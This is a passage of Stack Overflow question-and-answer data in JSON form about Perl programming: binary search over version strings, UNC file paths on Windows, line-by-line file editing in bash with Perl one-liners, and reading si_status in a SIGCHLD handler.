"https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1466519727, "post_id": 37947309, "comment_id": 63343469, "body": "If the version is always of the form xx.x.x, this works. But it fails if some are x.x.x. That&#39;s why the other two solutions form a key."}, {"owner": {"reputation": 13399, "user_id": 716443, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a8d13509991dbbd5467f01f55988ae4e?s=128&d=identicon&r=PG", "display_name": "DavidO", "link": "https://stackoverflow.com/users/716443/davido"}, "reply_to_user": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1466520476, "post_id": 37947309, "comment_id": 63344044, "body": "I agree, but the sample data seemed to indicate 2 digit years.  If there&#39;s a possibility of going back to the 0x years, then <code>sprintf &quot;%02u%1u%1u&quot;, shift</code> would provide a normalized string, though if normalization is needed, I also agree that your integer packing is going to be faster (which is why I upvoted your answer)."}], "tags": [], "owner": {"reputation": 13399, "user_id": 716443, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a8d13509991dbbd5467f01f55988ae4e?s=128&d=identicon&r=PG", "display_name": "DavidO", "link": "https://stackoverflow.com/users/716443/davido"}, "is_accepted": false, "score": 2, "last_activity_date": 1466520023, "last_edit_date": 1466520023, "creation_date": 1466519580, "answer_id": 37947309, "question_id": 37932149, "link": "https://stackoverflow.com/questions/37932149/searching-an-array-of-version-numbers-in-perl/37947309#37947309", "title": "Searching an array of version numbers in Perl", "body": "<p>Your version strings look normal enough, and your description supports the notion that you could probably just do a string comparison without further conversion.  And the domain they represent is unlikely to change arbitrarily (quarters will always be quarters, for example).  So since they are relationally comparable as strings, a simple string comparison is probably adequate.</p>\n\n<p>The <code>binsearch_pos</code> function from <a href=\"http://search.cpan.org/search?query=list%3A%3Abinarysearch&amp;mode=all\" rel=\"nofollow\">List::BinarySearch</a> will provide the index of the target element, or if the target element is not found, the index at which point the target could be inserted to preserve order.  It is a stable binary search, so it will always return the lowest index where the target matches.  Those characteristics seem to provide exactly what you need:</p>\n\n<pre><code>use List::BinarySearch qw(binsearch_pos);\n\nmy @array = qw(\n    16.3.1\n    16.2.5\n    16.1.4\n    15.3.5\n    15.1.1\n);\n\nprint \"$_: $array[$_]\\t\" foreach 0 .. $#array;\nprint \"\\n\\n\";\n\nprint \"$_: \", (binsearch_pos {$b cmp $a} $_, @array), \"\\n\"\n    foreach qw(16.3.1  16.3.6  16.2.7  16.2.5  16.2.4  15.1.1  15.1.3  15.1.0);\n</code></pre>\n\n<p>If the list of versions is short, then <code>List::MoreUtils::first_ix</code> is a simple linear approach that will be sufficiently efficient.  If the list is sufficiently large, the binary search might be worth considering, as it scales logarithmically rather than linearly. This means as your list of version strings grows the time needed to search the list will grow at a slower rate using the binary search than it would using a linear search.</p>\n\n<p>Because your list is in descending order, this solution uses <code>$b cmp $a</code>, which accommodates that descending order.</p>\n"}], "owner": {"reputation": 479, "user_id": 3595231, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/d5451a5e41eae7299deb485e11dc5041?s=128&d=identicon&r=PG&f=1", "display_name": "user3595231", "link": "https://stackoverflow.com/users/3595231/user3595231"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 154, "favorite_count": 0, "answer_count": 3, "score": 1, "last_activity_date": 1467554618, "creation_date": 1466458318, "last_edit_date": 1466458959, "question_id": 37932149, "link": "https://stackoverflow.com/questions/37932149/searching-an-array-of-version-numbers-in-perl", "title": "Searching an array of version numbers in Perl", "body": "<p>I have a problem to solve, which is to find the index of a target version from an index array.  The index array looks like: <code>{16.3.1, 16.2.5, 16.1.4, 15.3.5, 15.1.1}</code>.</p>\n\n<p>For each individual item in this array (such as <code>16.3.1</code>), it is concatenated of these 3 parts:</p>\n\n<ol>\n<li><code>16</code> is the yearly release number.</li>\n<li><code>3</code> is the quarterly release number, and it is in the range of {1,2,3,4}. </li>\n<li><code>1</code> is the bi-weekly release number, and it can be one of these 6 options (1,2,3,4,5,6). </li>\n<li>And the array is sorted in descending order.  </li>\n</ol>\n\n<p>Now these are the requirements:</p>\n\n<ol>\n<li><p>if I was giving a target version, such as <code>16.1.4</code>, this algorithm will return me the matching index from that array, which is 2. </p></li>\n<li><p>if I was giving a target version of <code>16.1.5</code>, which is not in that array, then it will return me the index of next available one, which is also 2. </p></li>\n<li><p>The target value is always higher than <code>15.1.1</code>, which means it will always return a valid index back. </p></li>\n</ol>\n\n<p>I was thinking of converting such a value into a number, then to do a search. (For example, <code>16.1.4</code> => 16 * 24 + 1 * 6 + 4 = 394, ..., ) </p>\n\n<p>But I am just wondering if there is a simple way to solve this problem?</p>\n"}, {"tags": ["windows", "perl", "unc"], "comments": [{"owner": {"reputation": 1465, "user_id": 4681732, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Xuool.jpg?s=128&g=1", "display_name": "nbryans", "link": "https://stackoverflow.com/users/4681732/nbryans"}, "edited": false, "score": 2, "creation_date": 1466457133, "post_id": 37931830, "comment_id": 63314422, "body": "The upper case TXT is probably a problem."}, {"owner": {"user_type": "does_not_exist", "display_name": "user6090058"}, "reply_to_user": {"reputation": 1465, "user_id": 4681732, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Xuool.jpg?s=128&g=1", "display_name": "nbryans", "link": "https://stackoverflow.com/users/4681732/nbryans"}, "edited": false, "score": 0, "creation_date": 1466457243, "post_id": 37931830, "comment_id": 63314480, "body": "No, I just changed it to upper case, the same result, skipping"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 1, "creation_date": 1466457477, "post_id": 37931830, "comment_id": 63314574, "body": "Your code won&#39;t compile. Please copy and paste your real code if you want useful answers. Please show the part of your code that defines <code>$report</code> and writes to the file. Is <code>$report</code> that string <code>\\\\NYNAS\\NYNDS\\VOL\\DATA\\INVACCT\\FUND_RECS_PFI\\10001.ICNTL.201&zwnj;&#8203;60603.PROD.GAAP.PFI\\&zwnj;&#8203;10001.ICNTL.20160602&zwnj;&#8203;.20160603.OPR.GAAP.P&zwnj;&#8203;ROD.PFI.PRE.TXT</code>?"}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1466464903, "post_id": 37931830, "comment_id": 63316969, "body": "Re &quot;<i>I cannot understand why the script doesn&#39;t see the file</i>&quot;, How do you know that it doesn&#39;t see the file? Please include <code>$!</code> in the error message."}], "answers": [{"tags": [], "owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "is_accepted": false, "score": 2, "last_activity_date": 1466459004, "last_edit_date": 1466459004, "creation_date": 1466457785, "answer_id": 37932036, "question_id": 37931830, "link": "https://stackoverflow.com/questions/37931830/my-perl-script-doesnt-see-the-txt-file/37932036#37932036", "title": "My perl script doesn&#39;t see the txt file", "body": "<p>Is your file <code>10001.ICNTL.20160602.20160603.OPR.GAAP.PROD.PFI.PRE.txt</code> in directory <code>\\\\NYNAS\\NYNDS\\VOL\\DATA\\INVACCT\\FUND_RECS_PFI</code>?</p>\n\n<p>At a guess you're not escaping the file path correctly. Even if you use single-quotes, there is no way of representing the two leading backslashes in <a href=\"https://en.wikipedia.org/wiki/Path_(computing)#Uniform_Naming_Convention\" rel=\"nofollow\"><em>Uniform Naming Convention</em> (UNC) paths</a> without escaping at least one of them</p>\n\n<p>Check the output of <code>print $report, \"\\n\"</code> to see what you've really written</p>\n\n<p>My preference is to use <em>four</em> backslashes at the start of the path string, like this</p>\n\n<pre><code>my $report = '\\\\\\\\NYNAS\\NYNDS\\VOL\\DATA\\INVACCT\\FUND_RECS_PFI\\10001.ICNTL.20160603.PROD.GAAP.PFI\\\u200c\u200b10001.ICNTL.20160602.20160603.OPR.GAAP.PROD.PFI.PRE.TXT';\n\nprint -e $report ? \"Found\\n\" : \"Not found\\n\";\n</code></pre>\n\n<p>And Perl allows you to use <em>forward</em> slashes in place of backslashes in a Windows path, so you could write this instead if you prefer, but paths like this aren't valid in other Windows software</p>\n\n<pre><code>my $report = '//NYNAS/NYNDS/VOL/DATA/INVACCT/FUND_RECS_PFI/10001.ICNTL.20160603.PROD.GAAP.PFI/\u200c\u200b10001.ICNTL.20160602.20160603.OPR.GAAP.PROD.PFI.PRE.TXT';\n</code></pre>\n\n<p>Or another alternative is to relocate your current working directory. You cannot <code>cd</code> to a UNC path on the Windows command line, but Perl allows you to <code>chdir</code> successfully</p>\n\n<pre><code>chdir '//NYNAS/NYNDS/VOL/DATA/INVACCT/FUND_RECS_PFI' or die $!;\n</code></pre>\n\n<p>Thereafter all <em>relative</em> file paths will be relative to this new working directory on your networked system</p>\n"}], "owner": {"user_type": "does_not_exist", "display_name": "user6090058"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 37, "favorite_count": 0, "closed_date": 1466481577, "answer_count": 1, "score": 0, "last_activity_date": 1466459004, "creation_date": 1466456817, "last_edit_date": 1466458274, "question_id": 37931830, "link": "https://stackoverflow.com/questions/37931830/my-perl-script-doesnt-see-the-txt-file", "closed_reason": "Needs details or clarity", "title": "My perl script doesn&#39;t see the txt file", "body": "\n\n<p>My Perl program creates the file       </p>\n\n<pre class=\"lang-none prettyprint-override\"><code> 10001.ICNTL.20160602.20160603.OPR.GAAP.PROD.PFI.PRE.txt     \n</code></pre>\n\n<p>Then in method I have a code:          </p>\n\n<pre class=\"lang-none prettyprint-override\"><code>if ( -e $report ) {     \n    # we parse the filet here is some code, at the end     \n{     \nelse     \n}     \n    print \"*** Skipping \\\\NYNAS\\NYNDS\\VOL\\DATA\\INVACCT\\FUND_RECS_PFI\\10001.ICNTL.20160603.PROD.GAAP.PFI\\10001.ICNTL.20160602.20160603.OPR.GAAP.PROD.PFI.PRE.TXT        \n}     \n</code></pre>\n\n<p>I cannot understand why the script doesn't see the file. I've checked it several times letter by letter. Can it be because of the Upper case <code>TXT</code>, but in reality it is lower case?</p>\n"}, {"tags": ["bash", "perl"], "comments": [{"owner": {"reputation": 62252, "user_id": 1435869, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/TrEd9.jpg?s=128&g=1", "display_name": "karakfa", "link": "https://stackoverflow.com/users/1435869/karakfa"}, "edited": false, "score": 3, "creation_date": 1466453771, "post_id": 37930942, "comment_id": 63312896, "body": "all text processing tools can read the file line by line and process, there is no need to involve bash loops for this."}, {"owner": {"reputation": 33642, "user_id": 620097, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/820980fd43f2607a815c1f3dbfe152cc?s=128&d=identicon&r=PG", "display_name": "shellter", "link": "https://stackoverflow.com/users/620097/shellter"}, "reply_to_user": {"reputation": 62252, "user_id": 1435869, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/TrEd9.jpg?s=128&g=1", "display_name": "karakfa", "link": "https://stackoverflow.com/users/1435869/karakfa"}, "edited": false, "score": 1, "creation_date": 1466454189, "post_id": 37930942, "comment_id": 63313097, "body": "Agree with @karakfa : Do you know that <code>sed -i &#39;s&#47;a&#47;b&#47;&#39; file</code> can process the whole file all at once, is much more efficient, and (obviously) has a lot less code? Good luck."}, {"owner": {"reputation": 38472, "user_id": 1815797, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8be290f9af1ba6048c7022ef1109efc6?s=128&d=identicon&r=PG", "display_name": "gniourf_gniourf", "link": "https://stackoverflow.com/users/1815797/gniourf-gniourf"}, "edited": false, "score": 0, "creation_date": 1466455532, "post_id": 37930942, "comment_id": 63313692, "body": "If you want to edit the file, why don&#39;t you use an editor? <code>ex</code> and <code>ed</code> come to mind\u2026"}, {"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1466455968, "post_id": 37930942, "comment_id": 63313892, "body": "What is the condition, exactly?"}, {"owner": {"reputation": 233489, "user_id": 14122, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/5e2861b08f37fa306fbf5384994af688?s=128&d=identicon&r=PG", "display_name": "Charles Duffy", "link": "https://stackoverflow.com/users/14122/charles-duffy"}, "edited": false, "score": 2, "creation_date": 1466465185, "post_id": 37930942, "comment_id": 63317050, "body": "re: reading line-by-line, see <a href=\"http://mywiki.wooledge.org/BashFAQ/001\" rel=\"nofollow noreferrer\">mywiki.wooledge.org/BashFAQ/001</a> for best practices. But... if you&#39;re doing that, why in the world would you also use <code>perl -i</code> or <code>sed -i</code>? If you want to replace one string with another, then <code>echo &quot;${p&#47;&#47;a&#47;b}&quot;</code> will do so <b>much</b> more efficiently."}], "answers": [{"comments": [{"owner": {"reputation": 233489, "user_id": 14122, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/5e2861b08f37fa306fbf5384994af688?s=128&d=identicon&r=PG", "display_name": "Charles Duffy", "link": "https://stackoverflow.com/users/14122/charles-duffy"}, "edited": false, "score": 0, "creation_date": 1466465025, "post_id": 37931079, "comment_id": 63317000, "body": "Putting <code>&gt;&gt; temp_out.txt</code> on each <code>echo</code> is horribly inefficient -- it&#39;s reopening the output file every time you want to write to it, instead of just holding one file descriptor open for write for the entire operationt."}, {"owner": {"reputation": 233489, "user_id": 14122, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/5e2861b08f37fa306fbf5384994af688?s=128&d=identicon&r=PG", "display_name": "Charles Duffy", "link": "https://stackoverflow.com/users/14122/charles-duffy"}, "edited": false, "score": 1, "creation_date": 1466465042, "post_id": 37931079, "comment_id": 63317004, "body": "Put <code>&gt; temp_out.txt</code> after the <code>done</code> on your loop, and you&#39;ll avoid all those <code>open</code> and <code>close</code> operations."}, {"owner": {"reputation": 233489, "user_id": 14122, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/5e2861b08f37fa306fbf5384994af688?s=128&d=identicon&r=PG", "display_name": "Charles Duffy", "link": "https://stackoverflow.com/users/14122/charles-duffy"}, "edited": false, "score": 0, "creation_date": 1466465100, "post_id": 37931079, "comment_id": 63317020, "body": "Also, <code>echo $p</code> is buggy. Use <code>printf &#39;%s\\n&#39; &quot;$p&quot;</code>, or at least <code>echo &quot;$p&quot;</code> -- though the latter still will do things like delete a line containing only <code>-n</code>, it won&#39;t have the bad side effects of <code>echo $p</code>, which will replace a line containing <code>*</code> with a list of files in the current directory, replace tabs with spaces, etc."}, {"owner": {"reputation": 233489, "user_id": 14122, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/5e2861b08f37fa306fbf5384994af688?s=128&d=identicon&r=PG", "display_name": "Charles Duffy", "link": "https://stackoverflow.com/users/14122/charles-duffy"}, "edited": false, "score": 0, "creation_date": 1466465121, "post_id": 37931079, "comment_id": 63317027, "body": "Also, change your <code>read</code> to <code>read -r</code>, or your loop will remove backslashes from the input."}, {"owner": {"reputation": 233489, "user_id": 14122, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/5e2861b08f37fa306fbf5384994af688?s=128&d=identicon&r=PG", "display_name": "Charles Duffy", "link": "https://stackoverflow.com/users/14122/charles-duffy"}, "edited": false, "score": 0, "creation_date": 1466465145, "post_id": 37931079, "comment_id": 63317039, "body": "Also, make it <code>while IFS= read -r p</code> -- without the <code>IFS=</code>, you&#39;ll delete trailing whitespace from the input."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 233489, "user_id": 14122, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/5e2861b08f37fa306fbf5384994af688?s=128&d=identicon&r=PG", "display_name": "Charles Duffy", "link": "https://stackoverflow.com/users/14122/charles-duffy"}, "edited": false, "score": 0, "creation_date": 1466465215, "post_id": 37931079, "comment_id": 63317055, "body": "@CharlesDuffy Thank you. I had that in mind originally (and then messed it up) -- but then I wanted a clear answer.  However, you are right of course. I&#39;m inclined to leave what&#39;s there and <i>add</i> this explanation."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 233489, "user_id": 14122, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/5e2861b08f37fa306fbf5384994af688?s=128&d=identicon&r=PG", "display_name": "Charles Duffy", "link": "https://stackoverflow.com/users/14122/charles-duffy"}, "edited": false, "score": 0, "creation_date": 1466465277, "post_id": 37931079, "comment_id": 63317067, "body": "@CharlesDuffy  Well, sure, thank you. I didn&#39;t mean to touch OP code, just to fix the direct error.  You are right, thank you, I&#39;ll add all this."}, {"owner": {"reputation": 233489, "user_id": 14122, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/5e2861b08f37fa306fbf5384994af688?s=128&d=identicon&r=PG", "display_name": "Charles Duffy", "link": "https://stackoverflow.com/users/14122/charles-duffy"}, "edited": false, "score": 0, "creation_date": 1466465781, "post_id": 37931079, "comment_id": 63317188, "body": "(One might also consider using <code>&quot;${p&#47;&#47;a&#47;b}&quot;</code> to do the replacement in shell, rather than requiring a pipeline and subprocess for every line)."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 233489, "user_id": 14122, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/5e2861b08f37fa306fbf5384994af688?s=128&d=identicon&r=PG", "display_name": "Charles Duffy", "link": "https://stackoverflow.com/users/14122/charles-duffy"}, "edited": false, "score": 0, "creation_date": 1466467440, "post_id": 37931079, "comment_id": 63317579, "body": "@CharlesDuffy  Thank you very much -- I didn&#39;t mean to go to all this but you are completely right, I should.  Also, thanks for some pointers here which I didn&#39;t know about."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 233489, "user_id": 14122, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/5e2861b08f37fa306fbf5384994af688?s=128&d=identicon&r=PG", "display_name": "Charles Duffy", "link": "https://stackoverflow.com/users/14122/charles-duffy"}, "edited": false, "score": 0, "creation_date": 1466467506, "post_id": 37931079, "comment_id": 63317599, "body": "@MAS Thank you for the attribution!  However, please also have a look at the addition, which provides improvements on the bash code."}], "tags": [], "owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "is_accepted": true, "score": 3, "last_activity_date": 1466538399, "last_edit_date": 1495541306, "creation_date": 1466453674, "answer_id": 37931079, "question_id": 37930942, "link": "https://stackoverflow.com/questions/37930942/reading-and-writing-line-by-line-in-a-bash-script/37931079#37931079", "title": "Reading and writing line by line in a bash script", "body": "<p><strong>Update</strong> &nbsp; A <em>far</em> better version of bash code added.  Thanks to <a href=\"https://stackoverflow.com/users/14122/charles-duffy\">Charles Duffy</a> for comments.  </p>\n\n<hr>\n\n<p>Your Perl one-liner takes a line piped into it by <code>echo $p |</code>, getting its standard input that way. It doesn't do anything with the file itself, so the <code>-i</code> flag has no effect. The <code>-p</code> makes it print to the standard output stream. So that whole line, <code>echo ...</code>, doesn't touch the file.</p>\n\n<p>You can redirect the output to a new file and then move that to overwrite <code>file.txt</code>. Here is a simple minded example, that appends each line to a new file. For better bash code see the update below.</p>\n\n<pre><code>while read p; do\n    if condition\n    then\n        echo $p | perl -pe 's/a/b/' &gt;&gt; temp_out.txt\n    else\n        echo $p &gt;&gt; temp_out.txt\n    fi\ndone &lt; file.txt\nmv temp_out.txt file.txt\n</code></pre>\n\n<p>We have to add the <code>else</code> where all unmodified lines are also appended.  Note that in general we cannot have just some lines replaced but the whole file has to be re-written.</p>\n\n<p>If this is all that the script does you can do it with a very simple one-liner, see the end.  If more work is done you can also put it all in a Perl script but I take it that there may be other good reasons for a bash script.</p>\n\n<hr>\n\n<p><strong>Update</strong> &nbsp; A much better version of the above.  See <code>read</code> and <code>echo</code> in <a href=\"http://www.gnu.org/software/bash/manual/html_node/Bash-Builtins.html#Bash-Builtins\" rel=\"nofollow noreferrer\"><code>Builtins in Bash manual</code></a></p>\n\n<ul>\n<li><p>Appending each line opens the file anew each time without a need for that.\nJust redirect at the end of the loop, much like it is done in the terminal</p></li>\n<li><p><code>read</code> uses backslash for escaping, removing it from input. Turn that off with <code>-r</code></p></li>\n<li><p>Trailing white space is removed, as a part of breaking the line into words. Suppress this by unsetting the variable that controls which characters are used for splitting, <code>IFS=</code></p></li>\n<li><p>The <code>echo $p</code> can do all kinds of unintended things.  A formatted print is better, <code>printf '%s\\n' \"$p\"</code>, or at least <code>echo \"$p\"</code></p></li>\n</ul>\n\n<p>With this,</p>\n\n<pre><code>while IFS= read -r p; do\n    if condition\n    then\n        echo \"$p\" | perl -pe 's/a/b/'\n    else\n        echo \"$p\"\n    fi\ndone &lt; file.txt  &gt; temp_out.txt\nmv temp_out.txt file.txt\n</code></pre>\n\n<p>Finally, if the sole purpose of the Perl one-liner were to run a simple substitution, it is much better to simply do that in the shell itself than to have a pipeline and run a whole new process for each line.</p>\n\n<pre><code>echo \"${p//a/b}\"\n</code></pre>\n\n<p>Thanks to <a href=\"https://stackoverflow.com/users/14122/charles-duffy\">Charles Duffy</a> for raising all these points in comments.</p>\n\n<hr>\n\n<p><em>A few comments on Perl one-liners.  See documentation at <a href=\"http://perldoc.perl.org/perlrun.html\" rel=\"nofollow noreferrer\"><code>perlrun</code></a>.</em></p>\n\n<p>The command <code>perl -e '...'</code> executes any valid Perl code between <code>''</code>. When we add the <code>-n</code> or <code>-p</code> switch it also reads standard input and executes that code on a line of it at the time, where <code>-p</code> also prints out each line after it's processed. The standard input can be supplied to it from a file,</p>\n\n<pre><code>perl -pe '...' input.txt\n</code></pre>\n\n<p>in which case adding <code>-i</code> flag will result in the file being changed in-place.  Or, the input can be piped into it, for example</p>\n\n<pre><code>echo \"input text\" | perl -pe '...'\n</code></pre>\n\n<p>in which case the processed line is printed to standard output. This can be redirected to a file, as in the answer above. </p>\n\n<hr>\n\n<p>To make changes to a given file a line at a time you only need this on the command line</p>\n\n<pre><code>perl -i -pe 's/a/b/' file.txt\n</code></pre>\n\n<p>If there is more work to do then it may well be better to put it in a script, of course. In this case the one-liner can be a command in the bash script as well, replacing all that code above (unless some bash-specific functionality is preferred for processing lines).</p>\n"}], "owner": {"reputation": 111, "user_id": 6410734, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6653f2a34288cd073336470fe93e6e2a?s=128&d=identicon&r=PG&f=1", "display_name": "MAS", "link": "https://stackoverflow.com/users/6410734/mas"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 312, "favorite_count": 0, "accepted_answer_id": 37931079, "answer_count": 1, "score": 3, "last_activity_date": 1466538399, "creation_date": 1466453128, "last_edit_date": 1466453223, "question_id": 37930942, "link": "https://stackoverflow.com/questions/37930942/reading-and-writing-line-by-line-in-a-bash-script", "title": "Reading and writing line by line in a bash script", "body": "<p>After searching online I was able to figure out how to read a file line by line:</p>\n\n<pre><code>while read p; do\n  echo $p\ndone &lt; file.txt\n</code></pre>\n\n<p>But I would actually like to modify the line in the file.\nFor example:</p>\n\n<pre><code>while read p; do\n  if condition\n  then\n    echo $p | perl -i -pe 's/a/b/'\n  fi\ndone &lt; file.txt\n</code></pre>\n\n<p>However this doesn't actually modify the file.</p>\n"}, {"tags": ["linux", "perl", "signals"], "answers": [{"comments": [{"owner": {"reputation": 497, "user_id": 3384373, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/41328490fc7a1482e26b5e2561384ad3?s=128&d=identicon&r=PG&f=1", "display_name": "Ameyj", "link": "https://stackoverflow.com/users/3384373/ameyj"}, "edited": false, "score": 0, "creation_date": 1466450393, "post_id": 37929924, "comment_id": 63311209, "body": "Thanks :) .. I think I got confused between si_code and si_status. the man page says it is exit code of the child."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "reply_to_user": {"reputation": 497, "user_id": 3384373, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/41328490fc7a1482e26b5e2561384ad3?s=128&d=identicon&r=PG&f=1", "display_name": "Ameyj", "link": "https://stackoverflow.com/users/3384373/ameyj"}, "edited": false, "score": 1, "creation_date": 1466451940, "post_id": 37929924, "comment_id": 63311939, "body": "No, that&#39;s not what the man page says at all, and I already showed it can return something other than the exit code. The man page actually says the same thing I did. See my updated my answer, which corrects a few errors in your unpacking in addition to quoting the man page and showing how to interpret <code>si_status</code>."}], "tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": true, "score": 2, "last_activity_date": 1466453029, "last_edit_date": 1466453029, "creation_date": 1466449252, "answer_id": 37929924, "question_id": 37929679, "link": "https://stackoverflow.com/questions/37929679/how-to-interpret-si-status-value/37929924#37929924", "title": "How to interpret si_status value", "body": "<p>It's <code>si_status</code> (not <code>si_code</code>) that's <code>25</code>.</p>\n\n<blockquote>\n  <p>The <code>si_status</code> field contains the exit status of the child (if <code>si_code</code> is <code>CLD_EXITED</code>), or the signal number that caused the process to change state.</p>\n</blockquote>\n\n<p>If <code>si_code</code> is <code>CLD_EXITED</code>, the child exited normally with exit code <code>si_status</code>.</p>\n\n<p>If <code>si_code</code> is <code>CLD_KILLED</code>, the child was killed by signal <code>si_status</code>.</p>\n\n<hr>\n\n<p>There are a few errors in your unpacking. They are fixed in the following, and it shows how to interpret <code>si_status</code>:</p>\n\n<pre><code>use strict;\nuse warnings;\n\nuse IPC::Open3 qw( open3 );\nuse POSIX qw( CLD_EXITED );\n\nmy $done;\n\nsub sig_child {\n    my ($signo, $errno, $code, $trapno, $pid, $uid, $status) =\n        unpack(\"iiiiiii\", $_[2]);\n\n    print(\"$signo $errno $code $trapno $pid $uid $status\\n\");\n\n    if ($code == CLD_EXITED) {\n        if ($status) {\n            print(\"Process $pid exited with error $status\\n\");\n        } else {\n            print(\"Process $pid completed successfully\\n\");\n        }\n    } else {\n        print(\"Process $pid was killed by signal $status\\n\");\n    }\n\n    $done = 1;\n}\n\nPOSIX::sigaction(\n    POSIX::SIGCHLD,\n    POSIX::SigAction-&gt;new(\\&amp;sig_child, 0, POSIX::SA_SIGINFO),\n);\n\nsub test {\n    $done = 0;\n    no warnings qw( once );\n    open(local *CHILD_STDIN, '&lt;', '/dev/null') or die($!);\n    open3('&lt;&amp;CHILD_STDIN', '&gt;&amp;STDOUT', '&gt;&amp;STDERR', @_);\n    sleep(1) while !$done;\n}\n\ntest('perl', '-e', 'exit(123)');\ntest('perl', '-e', 'kill(TERM =&gt; $$)');\n</code></pre>\n\n<p>Output:</p>\n\n<pre><code>17 0 1 0 24351 2268518 123\nProcess 24351 exited with error 123\n17 0 2 0 24352 2268518 15\nProcess 24352 was killed by signal 15\n</code></pre>\n"}], "owner": {"reputation": 497, "user_id": 3384373, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/41328490fc7a1482e26b5e2561384ad3?s=128&d=identicon&r=PG&f=1", "display_name": "Ameyj", "link": "https://stackoverflow.com/users/3384373/ameyj"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1250, "favorite_count": 0, 